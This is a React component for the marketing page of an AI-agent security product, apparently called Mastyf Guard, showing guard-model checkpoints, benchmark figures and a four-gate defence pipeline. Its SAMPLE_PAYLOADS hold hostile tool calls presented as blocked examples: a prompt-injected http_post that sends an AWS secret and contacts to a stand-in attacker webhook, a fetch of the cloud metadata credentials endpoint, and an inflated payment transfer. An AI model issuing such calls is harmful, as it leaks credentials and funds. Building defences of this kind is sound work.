'use client';

import { useState } from 'react';
import Link from 'next/link';
import { 
  Cpu, 
  Workflow, 
  ShieldCheck, 
  Flame, 
  Terminal, 
  Layers, 
  ExternalLink, 
  Copy, 
  Check, 
  CheckCircle2, 
  XCircle, 
  Activity, 
  Binary, 
  Database,
  ArrowRight,
  Lock,
  Zap,
  SlidersHorizontal,
  ChevronRight
} from 'lucide-react';
import { AgentSecurityCheck } from './AgentSecurityCheck';
import { ThreatLabInteractive } from './ThreatLabInteractive';

// --- Model Checkpoint Data ---
const MODEL_CHECKPOINTS = [
  {
    id: 'v6',
    name: 'Mastyf Guard 1.5B (V6 Frozen Baseline)',
    badge: 'Production Champion',
    tagline: 'Boundary-sharpened contrastive SFT + LoRA on Qwen 2.5 1.5B',
    defenseRate: 98.43,
    utilityRate: 90.89,
    accuracy: 94.66,
    latencyP50: 267.7,
    fpr: 0.0,
    hardware: 'CPU Only (0 MB GPU VRAM)',
    size: '986 MB (Q4_K_M GGUF)',
    description: 'Fine-tuned with hard-negative contrastive gap parameters to audit in-scope relational parameter poisoning without false positives on benign workflows.',
    huggingFaceUrl: 'https://huggingface.co/Rudraneel93/mastyf-guard-1.5b-v2-boundary-sharpened',
    ollamaCommand: 'ollama run mastyf-guard:v2'
  },
  {
    id: 'v5',
    name: 'Mastyf Guard V5 (Relational SFT)',
    badge: 'High Utility',
    tagline: 'Relational invariant alignment without contrastive gap constraints',
    defenseRate: 89.42,
    utilityRate: 99.81,
    accuracy: 94.62,
    latencyP50: 283.5,
    fpr: 0.02,
    hardware: 'CPU Only',
    size: '986 MB',
    description: 'Trained strictly on structural parameter validity. Exceptional utility preservation (99.81%) with slight vulnerability to multi-slot obfuscated evasions.'
  },
  {
    id: 'v4',
    name: 'Mastyf Guard V4 (Semantic SFT)',
    badge: 'Over-Refusing',
    tagline: 'Semantic instruction-tuning without relational gap bounds',
    defenseRate: 100.0,
    utilityRate: 58.97,
    accuracy: 79.48,
    latencyP50: 248.7,
    fpr: 41.03,
    hardware: 'CPU Only',
    size: '986 MB',
    description: 'Catches 100% of attacks through blanket refusal, producing an unacceptable 41% false alarm rate on benign enterprise commands.'
  },
  {
    id: 'base',
    name: 'Qwen 2.5 1.5B (Base Zero-Shot)',
    badge: 'Foundation Model',
    tagline: 'Off-the-shelf instruction model prompted as a security guard',
    defenseRate: 93.5,
    utilityRate: 64.2,
    accuracy: 78.8,
    latencyP50: 1153.0,
    fpr: 35.8,
    hardware: 'CPU / GPU',
    size: '1.2 GB',
    description: 'Standard foundation model prompted as a guard. Emits verbose reasoning tokens making it 4.3x slower with uncalibrated false alarms.'
  }
];

// --- 4 Gates Data ---
const GATES_DATA = [
  {
    step: 'Gate 01',
    name: 'Structural Relational Invariants',
    latency: '17.3 µs (P50)',
    focus: 'Deterministic Syntax & Parameter Invariants',
    description: 'Evaluates four typed relational invariants (Destination Deviation, Scope Expansion, Privilege Overgrant, Secondary Side-Effects) on CPU.',
    checks: ['Strict JSON schema validation', 'Path containment (rejects ../ traversal)', 'Monetary clamping on compound parameters', 'FQDN destination allowlisting']
  },
  {
    step: 'Gate 02',
    name: 'Capability-Based Access Control (CBAC)',
    latency: '< 4.8 µs',
    focus: 'Cryptographic Authorization',
    description: 'Every tool invocation must be accompanied by an HMAC-signed capability token bound to the active session and authorized capability envelope.',
    checks: ['HMAC-SHA256 token verification', 'Session-bound envelope verification', 'Replay attack deterrence via monotonic nonces', '0 backend bytes on non-ALLOW']
  },
  {
    step: 'Gate 03',
    name: 'Dynamic Information Flow Control (DIFC)',
    latency: '< 12 µs',
    focus: 'Cross-Tool Taint Tracking',
    description: 'Tracks data taint labels as information moves across tool outputs. Prevents an agent that ingested untrusted external documents from writing to sensitive internal storage.',
    checks: ['Multi-tool taint propagation tracking', 'Cross-tool exfiltration channel severance', 'Declassification authorization validation', 'Stateful sequence enforcement']
  },
  {
    step: 'Gate 04',
    name: 'Neural Semantic Auditor (Mastyf Guard 1.5B)',
    latency: '267.7 ms (CPU)',
    focus: 'Subordinate Semantic Ambiguity',
    description: 'When structural checks detect ambiguity, the frozen V6 boundary-sharpened model audits the tool invocation against intent context. Governed by Afinal ⊆ Astruct.',
    checks: ['In-scope parameter poisoning detection', 'Indirect prompt injection semantic boundary review', 'Revocation authority only (cannot grant permissions)', 'Zero false positive guarantee on clean ops']
  }
];

const SAMPLE_PAYLOADS = [
  {
    title: 'Indirect Prompt Injection (InjecAgent DS)',
    tool: 'http_post',
    payload: '{\n  "url": "https://attacker-webhook.xyz/exfil",\n  "headers": { "Authorization": "Bearer AWS_SECRET_KEY" },\n  "body": "{\\"contacts\\": [...]}"\n}',
    description: 'Adversarial instruction in untrusted email instructs agent to exfiltrate credentials.',
    verdict: 'BLOCKED AT CBAC + DIFC',
    latency: '17.3 µs (P50)',
    bytesEmitted: 0
  },
  {
    title: 'Cloud Metadata SSRF (Garak)',
    tool: 'fetch',
    payload: '{\n  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",\n  "method": "GET"\n}',
    description: 'Agent tricked into querying AWS metadata service to steal IAM role credentials.',
    verdict: 'BLOCKED AT FAST PATH',
    latency: '4.2 µs',
    bytesEmitted: 0
  },
  {
    title: 'Compound Ledger Multi-Slot Offset',
    tool: 'stripe_transfer',
    payload: '{\n  "recipient_id": "acct_84920491",\n  "amount_cents": 4900,\n  "fee_offset_multiplier": 1000,\n  "currency": "usd"\n}',
    description: 'Subtle fee calculation inflation attempting to bypass static amount limits.',
    verdict: 'BLOCKED AT NEURAL GATE',
    latency: '267.7 ms',
    bytesEmitted: 0
  },
  {
    title: 'Benign Enterprise Git Operation',
    tool: 'git_checkout',
    payload: '{\n  "branch": "feature/security-audit",\n  "create_if_missing": false\n}',
    description: 'Legitimate developer tool call requesting branch checkout within authorized workspace.',
    verdict: 'ALLOWED (PASS)',
    latency: '12.1 µs',
    bytesEmitted: 84
  }
];

export function UnifiedProductStage() {
  const [activeTab, setActiveTab] = useState<'models' | 'pipeline' | 'scanner' | 'threat-lab'>('models');
  const [selectedModel, setSelectedModel] = useState<string>('v6');
  const [selectedGate, setSelectedGate] = useState<number>(0);
  const [selectedPayload, setSelectedPayload] = useState<number>(0);
  const [copiedOllama, setCopiedOllama] = useState<boolean>(false);

  const model = MODEL_CHECKPOINTS.find(m => m.id === selectedModel) || MODEL_CHECKPOINTS[0];
  const gate = GATES_DATA[selectedGate];
  const payload = SAMPLE_PAYLOADS[selectedPayload];

  const copyOllama = () => {
    navigator.clipboard.writeText('ollama run mastyf-guard:v2');
    setCopiedOllama(true);
    setTimeout(() => setCopiedOllama(false), 2000);
  };

  return (
    <section id="product-stage" className="relative py-20 px-6">
      <div className="max-w-[1180px] mx-auto">
        
        {/* Section Header */}
        <div className="text-center max-w-2xl mx-auto mb-10">
          <span className="inline-flex items-center gap-2 text-xs font-mono font-semibold tracking-wider uppercase text-amber-400 bg-amber-500/[0.08] border border-amber-500/20 px-3 py-1.5 rounded-full mb-3">
            <SlidersHorizontal className="w-3.5 h-3.5" />
            Interactive Product Stage
          </span>
          <h2 className="text-3xl md:text-4xl font-bold tracking-tight text-white mb-3">
            Experience Mastyf in Action.
          </h2>
          <p className="text-sm md:text-base text-slate-400 leading-relaxed">
            Test our model checkpoints, inspect the 4-gate fast-path pipeline, run a free agent security diagnostic, or simulate real attack vectors — all in one unified console.
          </p>
        </div>

        {/* Master Glass Stage Container */}
        <div className="rounded-2xl bg-slate-950/85 backdrop-blur-2xl border border-white/[0.08] shadow-2xl overflow-hidden">
          
          {/* Top Console Navigation Tabs */}
          <div className="flex items-center border-b border-white/[0.06] bg-slate-900/60 overflow-x-auto">
            <button
              onClick={() => setActiveTab('models')}
              className={`px-5 py-3.5 text-xs font-mono font-semibold transition-all border-r border-white/[0.04] flex items-center gap-2 shrink-0 ${
                activeTab === 'models'
                  ? 'text-amber-400 bg-white/[0.04] border-b-2 border-b-amber-500'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <Cpu className="w-4 h-4 text-amber-400" />
              <span>1. Mastyf Guard 1.5B (Model Hub)</span>
            </button>

            <button
              onClick={() => setActiveTab('pipeline')}
              className={`px-5 py-3.5 text-xs font-mono font-semibold transition-all border-r border-white/[0.04] flex items-center gap-2 shrink-0 ${
                activeTab === 'pipeline'
                  ? 'text-cyan-400 bg-white/[0.04] border-b-2 border-b-cyan-500'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <Workflow className="w-4 h-4 text-cyan-400" />
              <span>2. The 4-Gate Defense Pipeline</span>
            </button>

            <button
              onClick={() => setActiveTab('scanner')}
              className={`px-5 py-3.5 text-xs font-mono font-semibold transition-all border-r border-white/[0.04] flex items-center gap-2 shrink-0 ${
                activeTab === 'scanner'
                  ? 'text-emerald-400 bg-white/[0.04] border-b-2 border-b-emerald-500'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>3. Free Agent Risk Checker</span>
            </button>

            <button
              onClick={() => setActiveTab('threat-lab')}
              className={`px-5 py-3.5 text-xs font-mono font-semibold transition-all flex items-center gap-2 shrink-0 ${
                activeTab === 'threat-lab'
                  ? 'text-rose-400 bg-white/[0.04] border-b-2 border-b-rose-500'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <Flame className="w-4 h-4 text-rose-400" />
              <span>4. Threat Lab Simulator</span>
            </button>
          </div>

          {/* TAB 1: MODEL HUB & CHECKPOINTS */}
          {activeTab === 'models' && (
            <div className="p-6 md:p-8 space-y-8">
              
              {/* Checkpoint selector pills */}
              <div className="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-white/[0.06]">
                <div className="flex flex-wrap items-center gap-2">
                  <span className="text-xs font-mono text-slate-500 mr-2">Select Checkpoint:</span>
                  {MODEL_CHECKPOINTS.map((cp) => (
                    <button
                      key={cp.id}
                      onClick={() => setSelectedModel(cp.id)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-mono transition-all ${
                        selectedModel === cp.id
                          ? 'bg-amber-500 text-slate-950 font-bold shadow-md shadow-amber-500/20'
                          : 'bg-slate-900/80 text-slate-400 hover:text-white border border-white/[0.04]'
                      }`}
                    >
                      {cp.name.split(' ')[0]} {cp.name.split(' ')[1]} ({cp.defenseRate}%)
                    </button>
                  ))}
                </div>

                <div className="flex items-center gap-3">
                  <button
                    onClick={copyOllama}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/20 text-amber-300 font-mono text-xs transition-colors"
                  >
                    <Terminal className="w-3.5 h-3.5" />
                    <span>ollama run mastyf-guard:v2</span>
                    {copiedOllama ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3 text-amber-400" />}
                  </button>

                  <Link
                    href="https://huggingface.co/Rudraneel93/mastyf-guard-1.5b-v2-boundary-sharpened"
                    target="_blank"
                    rel="noreferrer"
                    className="inline-flex items-center gap-1 px-3 py-1.5 rounded-lg bg-white/[0.04] hover:bg-white/[0.08] text-xs font-medium text-slate-300 transition-colors border border-white/[0.06]"
                  >
                    <span>Hugging Face</span>
                    <ExternalLink className="w-3 h-3 text-slate-500" />
                  </Link>
                </div>
              </div>

              {/* Model details grid */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
                
                {/* Left 6 cols: Stats & Description */}
                <div className="lg:col-span-6 space-y-6">
                  <div>
                    <div className="flex items-center gap-2 mb-2">
                      <h3 className="text-xl font-bold text-white">{model.name}</h3>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20">
                        {model.badge}
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 font-mono mb-3">{model.tagline}</p>
                    <p className="text-xs text-slate-300 leading-relaxed">{model.description}</p>
                  </div>

                  {/* 4 Quantitative Cards */}
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                    <div className="p-3 rounded-xl bg-slate-900/60 border border-white/[0.04] text-center">
                      <span className="text-[10px] text-slate-400 font-mono block mb-1">Defense Rate</span>
                      <span className={`text-xl font-bold font-mono ${model.defenseRate > 95 ? 'text-emerald-400' : 'text-amber-400'}`}>
                        {model.defenseRate}%
                      </span>
                      <span className="text-[9px] text-slate-500 block mt-0.5">4,216 cases</span>
                    </div>

                    <div className="p-3 rounded-xl bg-slate-900/60 border border-white/[0.04] text-center">
                      <span className="text-[10px] text-slate-400 font-mono block mb-1">Utility Parity</span>
                      <span className={`text-xl font-bold font-mono ${model.utilityRate > 90 ? 'text-cyan-400' : 'text-amber-400'}`}>
                        {model.utilityRate}%
                      </span>
                      <span className="text-[9px] text-slate-500 block mt-0.5">Benign preserved</span>
                    </div>

                    <div className="p-3 rounded-xl bg-slate-900/60 border border-white/[0.04] text-center">
                      <span className="text-[10px] text-slate-400 font-mono block mb-1">False Positives</span>
                      <span className={`text-xl font-bold font-mono ${model.fpr === 0 ? 'text-emerald-400' : 'text-rose-400'}`}>
                        {model.fpr}%
                      </span>
                      <span className="text-[9px] text-slate-500 block mt-0.5">2,000 ops</span>
                    </div>

                    <div className="p-3 rounded-xl bg-slate-900/60 border border-white/[0.04] text-center">
                      <span className="text-[10px] text-slate-400 font-mono block mb-1">P50 Latency</span>
                      <span className="text-xl font-bold text-white font-mono">
                        {model.latencyP50}ms
                      </span>
                      <span className="text-[9px] text-slate-500 block mt-0.5">CPU only</span>
                    </div>
                  </div>

                  <div className="p-3.5 rounded-xl bg-slate-900/40 border border-white/[0.04] text-xs font-mono text-slate-400 flex items-center justify-between">
                    <span>Footprint: <strong className="text-white">{model.size}</strong></span>
                    <span>Hardware: <strong className="text-emerald-400">{model.hardware}</strong></span>
                  </div>
                </div>

                {/* Right 6 cols: Live Tool Payload Interception Sandbox */}
                <div className="lg:col-span-6 bg-slate-900/70 border border-white/[0.06] rounded-xl p-5">
                  <div className="flex items-center justify-between mb-3 text-xs font-mono">
                    <span className="text-amber-400 font-semibold flex items-center gap-1.5">
                      <Activity className="w-3.5 h-3.5" /> Test Scenario Invocations
                    </span>
                    <div className="flex gap-1.5">
                      {SAMPLE_PAYLOADS.map((_, idx) => (
                        <button
                          key={idx}
                          onClick={() => setSelectedPayload(idx)}
                          className={`px-2 py-0.5 rounded text-[10px] font-mono transition-colors ${
                            selectedPayload === idx
                              ? 'bg-amber-500 text-slate-950 font-bold'
                              : 'bg-slate-800 text-slate-400 hover:text-white'
                          }`}
                        >
                          S{idx + 1}
                        </button>
                      ))}
                    </div>
                  </div>

                  <pre className="p-3 rounded-lg bg-black/60 border border-white/[0.04] text-slate-200 text-xs font-mono max-h-44 overflow-x-auto mb-3">
                    <code>{payload.payload}</code>
                  </pre>

                  <div className="p-3 rounded-lg bg-slate-950/80 border border-white/[0.04] space-y-2 text-xs font-mono">
                    <div className="flex items-center justify-between">
                      <span className="text-slate-400">Enforcement Verdict:</span>
                      <span className={`px-2 py-0.5 rounded font-bold text-[10px] ${
                        payload.verdict.includes('BLOCKED')
                          ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                          : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                      }`}>
                        {payload.verdict}
                      </span>
                    </div>

                    <div className="flex items-center justify-between">
                      <span className="text-slate-400">Response Latency:</span>
                      <span className="text-amber-400 font-semibold">{payload.latency}</span>
                    </div>

                    <div className="flex items-center justify-between">
                      <span className="text-slate-400">Backend Wire Transmission:</span>
                      <span className={`font-bold ${payload.bytesEmitted === 0 ? 'text-emerald-400' : 'text-slate-200'}`}>
                        {payload.bytesEmitted} bytes (Fail-Closed)
                      </span>
                    </div>
                  </div>
                </div>

              </div>

            </div>
          )}

          {/* TAB 2: 4-GATE DEFENSE PIPELINE */}
          {activeTab === 'pipeline' && (
            <div className="p-6 md:p-8 space-y-8">
              {/* Gate selector pills */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                {GATES_DATA.map((g, idx) => (
                  <button
                    key={idx}
                    onClick={() => setSelectedGate(idx)}
                    className={`p-3.5 rounded-xl text-left border transition-all ${
                      selectedGate === idx
                        ? 'bg-cyan-500/[0.08] border-cyan-500/30 shadow-md'
                        : 'bg-slate-900/40 border-white/[0.04] hover:bg-white/[0.02]'
                    }`}
                  >
                    <div className="flex items-center justify-between text-[11px] font-mono text-slate-400 mb-1">
                      <span>{g.step}</span>
                      <span className={selectedGate === idx ? 'text-cyan-400 font-bold' : 'text-slate-500'}>{g.latency}</span>
                    </div>
                    <div className={`text-xs font-bold ${selectedGate === idx ? 'text-white' : 'text-slate-300'}`}>
                      {g.name}
                    </div>
                  </button>
                ))}
              </div>

              {/* Active Gate Breakdown */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center bg-slate-900/50 p-6 rounded-xl border border-white/[0.04]">
                <div className="lg:col-span-7">
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-xs font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                      {gate.step} :: {gate.focus}
                    </span>
                    <span className="text-xs font-mono text-amber-400">{gate.latency}</span>
                  </div>

                  <h3 className="text-xl font-bold text-white mb-3">{gate.name}</h3>
                  <p className="text-xs text-slate-300 leading-relaxed mb-6">{gate.description}</p>

                  <div className="space-y-2">
                    <span className="text-xs font-mono uppercase tracking-wider text-slate-400 block mb-1">
                      Verified Security Properties:
                    </span>
                    {gate.checks.map((chk, i) => (
                      <div key={i} className="flex items-center gap-2 text-xs text-slate-300">
                        <CheckCircle2 className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                        <span>{chk}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="lg:col-span-5 bg-slate-950/80 border border-white/[0.06] rounded-xl p-5 font-mono text-xs">
                  <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-3">Runtime State Machine</div>
                  <div className="space-y-3">
                    <div className="p-2.5 rounded bg-slate-900 border border-white/[0.04] flex items-center justify-between">
                      <span className="text-slate-400">Input Tool Call</span>
                      <span className="text-amber-400">Agent Proposed</span>
                    </div>
                    <div className="text-center text-slate-600 text-xs">↓</div>
                    <div className="p-2.5 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between">
                      <span className="text-cyan-300 font-bold">{gate.name}</span>
                      <span className="text-[10px] text-slate-400">{gate.latency}</span>
                    </div>
                    <div className="text-center text-slate-600 text-xs">↓</div>
                    <div className="grid grid-cols-2 gap-2 text-center text-[10px]">
                      <div className="p-2 rounded bg-rose-500/10 border border-rose-500/30 text-rose-400 font-bold">
                        NON-ALLOW (0 Bytes)
                      </div>
                      <div className="p-2 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold">
                        ALLOW (Dispatched)
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 3: FREE AGENT CHECKER */}
          {activeTab === 'scanner' && (
            <div className="p-6 md:p-8">
              <AgentSecurityCheck />
            </div>
          )}

          {/* TAB 4: THREAT LAB */}
          {activeTab === 'threat-lab' && (
            <div className="p-6 md:p-8">
              <ThreatLabInteractive />
            </div>
          )}

        </div>

      </div>
    </section>
  );
}
